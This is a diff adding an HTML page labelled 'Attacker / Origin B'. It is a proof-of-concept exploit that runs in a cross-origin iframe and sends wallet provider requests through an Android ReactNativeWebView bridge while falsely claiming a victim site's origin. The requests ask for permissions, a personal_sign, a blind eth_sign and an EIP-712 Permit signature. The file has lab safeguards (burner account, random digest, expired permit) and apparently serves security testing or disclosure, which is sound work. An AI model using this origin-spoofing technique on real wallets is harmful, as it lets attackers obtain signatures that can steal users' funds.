@@ -1,0 +1,34 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>Attacker / Origin B</title>
+Controlled cross-origin iframe B
+<script>
+'use strict';
+const victimOrigin=new URLSearchParams(location.search).get('victimOrigin');
+const bridge=window.ReactNativeWebView;
+if(!victimOrigin||new URL(victimOrigin).origin!==victimOrigin)throw Error('Invalid victimOrigin');
+const parentSend=data=>parent.postMessage(data,victimOrigin);
+const isAddress=value=>/^0x[0-9a-fA-F]{40}$/.test(value);
+const randomHex=(bytes=12)=>{const a=new Uint8Array(bytes);crypto.getRandomValues(a);return[...a].map(v=>v.toString(16).padStart(2,'0')).join('')};
+const textHex=text=>'0x'+[...new TextEncoder().encode(text)].map(v=>v.toString(16).padStart(2,'0')).join('');
+function request(id,method,params,proof){
+  if(!bridge?.postMessage)throw Error('Android ReactNativeWebView bridge unavailable');
+  bridge.postMessage(JSON.stringify({method:'provider_request',payload:JSON.stringify({id,origin:victimOrigin,request:{method,params}})}));
+  parentSend({type:'SENT',id,proof:{actualOrigin:location.origin,claimedOrigin:victimOrigin,method,...proof}});
+}
+addEventListener('message',event=>{
+  if(event.source!==parent||event.origin!==victimOrigin)return;
+  const {type,id,account,chainId}=event.data||{};
+  try{
+    if(type==='PERMISSIONS')return request(id,'wallet_getPermissions',[],{});
+    if(!isAddress(account))throw Error('Valid burner account required');
+    if(type==='PERSONAL'){const n=randomHex();const message=`CORE ANDROID CROSS-ORIGIN TEST\nActual sender: ${location.origin}\nClaimed requester: ${victimOrigin}\nNonce: ${n}`;return request(id,'personal_sign',[textHex(message),account],{account,message})}
+    if(type==='BLIND'){const digest='0x'+randomHex(32);return request(id,'eth_sign',[account,digest],{account,digest,safety:'random lab digest; reject'})}
+    if(type==='PERMIT'){
+      const typedData={types:{EIP712Domain:[{name:'name',type:'string'},{name:'version',type:'string'},{name:'chainId',type:'uint256'},{name:'verifyingContract',type:'address'}],Permit:[{name:'owner',type:'address'},{name:'spender',type:'address'},{name:'value',type:'uint256'},{name:'nonce',type:'uint256'},{name:'deadline',type:'uint256'}]},primaryType:'Permit',domain:{name:'Controlled Non-Contract Test',version:'1',chainId:Number.parseInt(chainId,16),verifyingContract:account},message:{owner:account,spender:'0x000000000000000000000000000000000000dEaD',value:'1',nonce:'0',deadline:'1'}};
+      return request(id,'eth_signTypedData_v4',[account,JSON.stringify(typedData)],{account,typedData,safety:'expired permit; EOA domain; reject'});
+    }
+  }catch(error){parentSend({type:'ERROR',id,message:error?.message||String(error)})}
+});
+parentSend({type:'READY',actualOrigin:location.origin,victimOrigin,isSubframe:self!==top,bridgeVisible:Boolean(bridge?.postMessage)});
+</script>
